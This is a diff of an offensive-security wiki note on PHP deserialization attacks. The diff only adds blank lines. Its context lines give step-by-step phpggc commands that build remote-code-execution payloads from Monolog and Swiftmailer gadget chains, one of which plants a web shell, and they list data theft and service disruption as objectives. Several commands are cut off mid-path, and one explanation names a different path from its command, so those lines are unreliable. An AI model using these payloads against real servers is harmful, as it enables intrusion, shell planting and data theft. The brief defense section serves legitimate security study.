@@ -37,6 +37,8 @@ To exploit this vulnerability, the attacker will typically send a specially craf
 
 The business value of this technique is that it allows an attacker to gain unauthorized access to a server, which can lead to the theft of sensitive data, disruption of services, and other malicious activities.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable PHP application.
@@ -44,6 +46,8 @@ The business value of this technique is that it allows an attacker to gain unaut
 1. Knowledge of the Monolog/RCE1 or Swiftmailer/FW1 gadget chain.
 
 1. Ability to send a specially crafted serialized object to the target server.
+
+ 
 
 ## Defense
 
@@ -53,6 +57,8 @@ The business value of this technique is that it allows an attacker to gain unaut
 
 1. Use a web application firewall (WAF) to detect and block malicious traffic.
 
+ 
+
 ## Objectives
 
 1. To gain remote code execution on the target server.
@@ -61,19 +67,35 @@ The business value of this technique is that it allows an attacker to gain unaut
 
 1. To disrupt services on the target server.
 
+ 
+
 # Instructions
 
 1. Run the following command:
 
+ 
+
+
+
 **Code**: [[phpggc monolog/rce1 'phpinfo();' -s]]
+
+
 
 > This command uses the phpggc tool to generate a payload using the Monolog/RCE1 gadget. The payload will execute the `phpinfo()` function on the target server.
 
 2. Run the following command:
 
+ 
+
+
+
 **Code**: [[phpggc monolog/rce1 assert 'phpinfo()']]
 
+
+
 > This command uses the phpggc tool to generate a payload using the Monolog/RCE1 gadget with the assert function. The payload will execute the `phpinfo()` function on the target server.
+
+
 
 **Command** ([[phpggc - Monolog RCE1]]):
 
@@ -81,15 +103,29 @@ The business value of this technique is that it allows an attacker to gain unaut
 phpggc monolog/rce1 assert 'phpinfo()'
 ```
 
+
+
 3. Run the following command:
 
+ 
+
+
+
 **Code**: [[phpggc swiftmailer/fw1 /var/www/html/shell.php /tm]]
+
+
 
 > This command uses the phpggc tool to generate a payload using the Swiftmailer/FW1 gadget. The payload will create a shell in the /tmp/data directory on the target server.
 
 4. Run the following command:
 
+ 
+
+
+
 **Code**: [[phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/te]]
+
+
 
 > This command uses the phpggc tool to generate a payload using the Monolog/RCE2 gadget. The payload will execute the `id` command on the target server and write the output to the /tmp/testinfo.ini file.
 
@@ -115,3 +151,5 @@ phpggc monolog/rce1 assert 'phpinfo()'
 
 - [[Finding and using gadgets]]
 - [[PHP Deserialization]]
+
+
